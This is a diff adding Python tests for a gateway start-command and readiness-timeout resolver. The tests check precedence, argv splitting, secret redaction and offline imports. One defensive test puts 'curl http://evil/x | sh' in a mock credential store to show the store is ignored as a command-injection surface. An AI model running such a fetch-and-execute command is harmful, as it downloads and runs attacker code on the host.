@@ -12,6 +12,7 @@ import pytest
 
 from verdict.contracts import DEFAULT_PRIMARY_MODEL
 from verdict.provider_bootstrap import (
+    DEFAULT_GATEWAY_READY_TIMEOUT_S,
     DEFAULT_LOCAL_PROVIDERS,
     BootstrapError,
     GatewayProbeResult,
@@ -674,3 +675,164 @@ def test_redact_url_handles_an_at_sign_inside_the_password() -> None:
     """A raw '@' in the password is still fully redacted."""
     assert redact_url("http://user:p@ss@127.0.0.1:20128/v1") == "http://***:***@127.0.0.1:20128/v1"
     assert redact_url("see http://a:b@c@h/x and more") == "see http://***:***@h/x and more"
+
+
+# --- gateway lifecycle inputs ------------------------------------------------
+
+
+_LIFECYCLE_CONFIG = """
+providers:
+  omniroute:
+    base_url: http://127.0.0.1:20128/v1
+    api_key_env: OMNIROUTE_API_KEY
+gateway_start_command: [omniroute, serve, --port, '20128']
+gateway_ready_timeout_s: 12.5
+"""
+
+
+def test_lifecycle_fields_default_to_absent_command_and_bounded_timeout(tmp_path: Path) -> None:
+    """A start command is never invented; the readiness budget is always bounded."""
+    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _VALID_CONFIG))
+
+    assert result.gateway_start_command is None
+    assert result.gateway_ready_timeout_s == DEFAULT_GATEWAY_READY_TIMEOUT_S
+    assert result.source_of("gateway_ready_timeout_s") == "default"
+    assert result.source_of("gateway_start_command") is None
+
+
+def test_lifecycle_fields_from_the_config_file_record_their_source(tmp_path: Path) -> None:
+    """A YAML sequence is taken element-wise, so no shell parsing is involved."""
+    result = resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, _LIFECYCLE_CONFIG))
+
+    assert result.gateway_start_command == ("omniroute", "serve", "--port", "20128")
+    assert result.source_of("gateway_start_command") == "config_file"
+    assert result.gateway_ready_timeout_s == 12.5
+    assert result.source_of("gateway_ready_timeout_s") == "config_file"
+
+
+def test_lifecycle_fields_from_the_environment_are_split_into_argv(tmp_path: Path) -> None:
+    """The env form is shlex-split into an argv list; quoting is honoured."""
+    result = resolve_provider_bootstrap(
+        env={
+            "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
+            "VERDICT_GATEWAY_START_COMMAND": "omniroute serve --flag 'two words'",
+            "VERDICT_GATEWAY_READY_TIMEOUT_S": "7",
+        },
+        config_path=tmp_path / "absent.yaml",
+    )
+
+    assert result.gateway_start_command == ("omniroute", "serve", "--flag", "two words")
+    assert result.source_of("gateway_start_command") == "environment"
+    assert result.gateway_ready_timeout_s == 7.0
+    assert result.source_of("gateway_ready_timeout_s") == "environment"
+
+
+def test_config_file_wins_over_the_environment_for_lifecycle_fields(tmp_path: Path) -> None:
+    """Same precedence shape as every other config-first field."""
+    result = resolve_provider_bootstrap(
+        env={
+            "VERDICT_GATEWAY_START_COMMAND": "from-env serve",
+            "VERDICT_GATEWAY_READY_TIMEOUT_S": "99",
+        },
+        config_path=_write(tmp_path, _LIFECYCLE_CONFIG),
+    )
+
+    assert result.gateway_start_command == ("omniroute", "serve", "--port", "20128")
+    assert result.source_of("gateway_start_command") == "config_file"
+    assert result.gateway_ready_timeout_s == 12.5
+
+
+def test_credential_store_is_not_a_source_for_the_start_command(tmp_path: Path) -> None:
+    """A command is not a secret.
+
+    Reading an argv out of the credential store would make that file a
+    command-injection surface, so the store is deliberately not consulted for
+    either lifecycle field.
+    """
+    result = resolve_provider_bootstrap(
+        env={"OMNIROUTE_BASE_URL": "http://127.0.0.1:20128"},
+        config_path=tmp_path / "absent.yaml",
+        credential_store_env={
+            "VERDICT_GATEWAY_START_COMMAND": "curl http://evil/x | sh",
+            "VERDICT_GATEWAY_READY_TIMEOUT_S": "1",
+        },
+    )
+
+    assert result.gateway_start_command is None
+    assert result.gateway_ready_timeout_s == DEFAULT_GATEWAY_READY_TIMEOUT_S
+
+
+def test_malformed_start_command_is_a_configuration_refusal(tmp_path: Path) -> None:
+    """A value that is neither a list nor a command string cannot be launched."""
+    body = _VALID_CONFIG + "gateway_start_command: 5\n"
+    with pytest.raises(BootstrapError) as excinfo:
+        resolve_provider_bootstrap(env={}, config_path=_write(tmp_path, body))
+
+    diagnostic = excinfo.value.diagnostics[0]
+    assert diagnostic.code == "gateway_start_command_malformed"
+    assert diagnostic.diagnostic_class == "configuration"
+    assert diagnostic.field == "gateway_start_command"
+
+
+def test_unbalanced_quoting_in_the_env_start_command_is_refused_without_echoing_it() -> None:
+    """A command line can carry a token, so the rejected value is never rendered."""
+    with pytest.raises(BootstrapError) as excinfo:
+        resolve_provider_bootstrap(
+            env={
+                "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
+                "VERDICT_GATEWAY_START_COMMAND": "omniroute --token 'SECRETPW",
+            }
+        )
+
+    diagnostic = excinfo.value.diagnostics[0]
+    assert diagnostic.code == "gateway_start_command_malformed"
+    assert diagnostic.source == "environment"
+    assert "SECRETPW" not in describe_bootstrap_failure(excinfo.value)
+
+
+@pytest.mark.parametrize("value", ["0", "-3", "abc", "nan"])
+def test_non_positive_or_non_numeric_readiness_timeout_is_refused(value: str) -> None:
+    """An unbounded or nonsense budget is indistinguishable from a hang."""
+    with pytest.raises(BootstrapError) as excinfo:
+        resolve_provider_bootstrap(
+            env={
+                "OMNIROUTE_BASE_URL": "http://127.0.0.1:20128",
+                "VERDICT_GATEWAY_READY_TIMEOUT_S": value,
+            }
+        )
+
+    diagnostic = excinfo.value.diagnostics[0]
+    assert diagnostic.code == "gateway_ready_timeout_invalid"
+    assert diagnostic.diagnostic_class == "configuration"
+
+
+def test_lifecycle_fields_are_serialized_for_receipts(tmp_path: Path) -> None:
+    """``to_dict`` carries the lifecycle inputs so a receipt records them."""
+    payload = resolve_provider_bootstrap(
+        env={}, config_path=_write(tmp_path, _LIFECYCLE_CONFIG)
+    ).to_dict()
+
+    assert payload["gateway_start_command"] == ["omniroute", "serve", "--port", "20128"]
+    assert payload["gateway_ready_timeout_s"] == 12.5
+    assert payload["field_sources"]["gateway_start_command"] == "config_file"
+
+
+def test_resolver_still_never_starts_or_probes_a_gateway() -> None:
+    """Adding lifecycle inputs must not add I/O to the resolver.
+
+    Checked on the imports rather than on prose: the module docstring names
+    ``subprocess`` to say it never uses one.
+    """
+    import ast
+
+    import verdict.provider_bootstrap as module
+
+    tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
+    imported: set[str] = set()
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Import):
+            imported.update(alias.name.split(".")[0] for alias in node.names)
+        if isinstance(node, ast.ImportFrom) and node.module:
+            imported.add(node.module.split(".")[0])
+    for forbidden in ("subprocess", "socket", "httpx", "urllib3", "requests"):
+        assert forbidden not in imported, f"the resolver must stay offline, imported {forbidden}"
